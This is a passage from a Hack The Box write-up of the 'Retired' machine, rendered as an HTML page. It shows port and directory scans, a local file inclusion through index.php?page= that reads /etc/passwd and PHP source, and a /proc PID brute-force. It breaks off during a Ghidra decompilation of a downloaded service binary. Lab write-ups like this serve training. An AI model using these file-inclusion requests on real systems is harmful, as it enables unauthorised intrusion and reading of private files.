@@ -1,0 +1,1451 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.713838186092">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 2.4.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Retired</title>
+    <meta name="title" content="Retired">
+    <meta name="description" content="IP: 10.10.11.154" />
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/retired/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/retired/">
+    <meta property="og:title" content="Retired">
+    <meta property="og:description" content="IP: 10.10.11.154">
+    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/retired/images/retired.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/retired/">
+    <meta property="twitter:title" content="Retired">
+    <meta property="twitter:description" content="IP: 10.10.11.154">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/retired/images/retired.png">
+
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=2.4.0.713838186092" rel="stylesheet" />
+
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.713838186092" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.713838186092" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.713838186092" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                        </g>
+                                    </svg>
+                                    <span>GitHub</span>
+                                </a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
+                                        </g>
+                                    </svg>
+                                    <span>HackTheBox</span>
+                                </a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+        
+                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
+                        </div>
+        
+                        <!-- Mobile search button mock -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placehokder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button mock -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+                </div>
+            
+                <div class="pl-6 mb-4 mt-1">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                </g>
+                                            </svg>
+                                            <span>GitHub</span>
+                                        </a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
+                                                </g>
+                                            </svg>
+                                            <span>HackTheBox</span>
+                                        </a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="grow min-w-0 px-6 md:px-16">
+                        <main class="relative pt-6 pb-16">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="retired" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#retired">#</doc-anchor-trigger>
+        <span>Retired</span>
+    </h1>
+</doc-anchor-target>
+<p><figure class="content-center">
+    <img src="images/retired.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>IP: 10.10.11.154</p>
+<doc-anchor-target id="nmap">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
+        <span>Nmap</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="all-ports">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#all-ports">#</doc-anchor-trigger>
+        <span>All ports</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.154
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="service-scan">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#service-scan">#</doc-anchor-trigger>
+        <span>Service Scan</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 22,80 10.10.11.154 -o nmap.txt
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
+|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
+|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
+80/tcp open  http    nginx
+| http-title: Agency - Start Bootstrap Theme
+|_Requested resource was /index.php?page=default.html
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="port-80">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80">#</doc-anchor-trigger>
+        <span>Port 80</span>
+    </h3>
+</doc-anchor-target>
+<p>Running gobuster we find some more pages:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">gobuster dir -u http://10.10.11.154 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x txt,html
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.194.200
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,html
+[+] Timeout:                 10s
+===============================================================
+2022/04/03 13:11:48 Starting gobuster in directory enumeration mode
+===============================================================
+/js                   (Status: 301) [Size: 162] [--&gt; http://10.129.194.200/js/]
+/css                  (Status: 301) [Size: 162] [--&gt; http://10.129.194.200/css/]
+/assets               (Status: 301) [Size: 162] [--&gt; http://10.129.194.200/assets/]
+/default.html         (Status: 200) [Size: 11414]                                  
+/beta.html            (Status: 200) [Size: 4144]                                   
+/.                    (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]</code></pre>
+</doc-codeblock></div>
+<p>Accessing <a href="http://10.10.11.154/beta.html">http://10.10.11.154/beta.html</a> we are redirected to <a href="http://10.10.11.154/index.php?page=beta.html">http://10.10.11.154/index.php?page=beta.html</a>:
+<figure class="content-center">
+    <img src="retired/images/image1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The page talks about uploading a license file of 512 bits to get into the beta program. When pressing the SUBMIT button we note that it is sending a POST request to <code v-pre>activate_license.php</code>.</p>
+<doc-anchor-target id="lfi">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#lfi">#</doc-anchor-trigger>
+        <span>LFI</span>
+    </h3>
+</doc-anchor-target>
+<p>So it seems that <code v-pre>index.php</code> is loading html pages from the <code v-pre>?page=</code> parameter as we can see above. We can try to load some internal system files:
+<a href="http://10.10.11.154/index.php?page=/etc/passwd">http://10.10.11.154/index.php?page=/etc/passwd</a></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+vagrant:x:1000:1000::/vagrant:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+dev:x:1001:1001::/home/dev:/bin/bash</code></pre>
+</doc-codeblock></div>
+<p>To understand better how the website works lets see the <code v-pre>index.php</code> source-code:
+<code v-pre>/index.php?page=/var/www/html/index.php</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-php"><code v-pre class="language-php">&lt;?php
+function sanitize_input($param) {
+    $param1 = str_replace(&quot;../&quot;,&quot;&quot;,$param);
+    $param2 = str_replace(&quot;./&quot;,&quot;&quot;,$param1);
+    return $param2;
+}
+
+$page = $_GET['page'];
+if (isset($page) &amp;&amp; preg_match(&quot;/^[a-z]/&quot;, $page)) {
+    $page = sanitize_input($page);
+} else {
+    header('Location: /index.php?page=default.html');
+}
+
+readfile($page);
+?&gt;</code></pre>
+</doc-codeblock></div>
+<p>So here we have our local-file-inclusion vulnerability.
+Now lets see how the <code v-pre>activate_license.php</code> file works when we press the &quot;SUBMIT&quot; button:
+<code v-pre>/index.php?page=/var/www/html/activate_license.php</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-php"><code v-pre class="language-php">&lt;?php
+if(isset($_FILES['licensefile'])) {
+    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
+    $license_size = $_FILES['licensefile']['size'];
+
+    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+    if (!$socket) { echo &quot;error socket_create()\n&quot;; }
+
+    if (!socket_connect($socket, '127.0.0.1', 1337)) {
+        echo &quot;error socket_connect()&quot; . socket_strerror(socket_last_error()) . &quot;\n&quot;;
+    }
+
+    socket_write($socket, pack(&quot;N&quot;, $license_size));
+    socket_write($socket, $license);
+
+    socket_shutdown($socket);
+    socket_close($socket);
+}
+?&gt;</code></pre>
+</doc-codeblock></div>
+<p>Based on the source-code, it is loading the file we submit and sending the file size and file content to a service running on 127.0.0.1 - port 1337. But what is this application running on that port?
+Since we have a LFI vulnerability we can bruteforce the directory <code v-pre>/proc/[PID]/maps</code> to find out the applications running on the target.
+Using this technique we can find not only files and binaries running in the system but its memory address as well. I will use Burp Intruder module to do this task.
+We set the payload position like that:
+<figure class="content-center">
+    <img src="images/image5.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>And set the payload to sequential numbers like that:
+<figure class="content-center">
+    <img src="images/image6.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>So we will bruteforce PIDs from 1-500 and see if we get anything interesting:
+<figure class="content-center">
+    <img src="images/image7.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We found a <code v-pre>activate_license</code> binary running on PID 424.</p>
+<p>We can read the <code v-pre>/proc/424/cmdline</code> to check if the binary was started with arguments:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">/usr/bin/activate_license 1337</code></pre>
+</doc-codeblock></div>
+<p>Yes, it seems to be the service running on port 1337 which receives the file we submit on the <code v-pre>beta.html</code> page.</p>
+<p>We can download the binary for local analysis:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ curl http://10.129.195.171/index.php?page=/usr/bin/activate_license -o activate_license</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="binary-analysis">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#binary-analysis">#</doc-anchor-trigger>
+        <span>Binary analysis</span>
+    </h3>
+</doc-anchor-target>
+<p>Looking at the <code v-pre>activate_license</code> binary using Ghidra we can see 2 interesting functions.</p>
+<ul>
+<li>main()</li>
+<li>activate_license()</li>
+</ul>
+<p>The main function starts a listening socket for incoming connections on a specified port. At the end it calls a function named <code v-pre>activate_license()</code>:
+<code v-pre>main()</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">main</div>
+<pre class="language-c"><code v-pre class="language-c">int main(int argc,char **argv)
+
+{
+  int iVar1;
+  __pid_t _Var2;
+  int *piVar3;
+  char *pcVar4;
+  char clientaddr_s [16];
+  sockaddr_in clientaddr;
+  socklen_t clientaddrlen;
+  sockaddr_in server;
+  uint16_t port;
+  int clientfd;
+  int serverfd;
+  
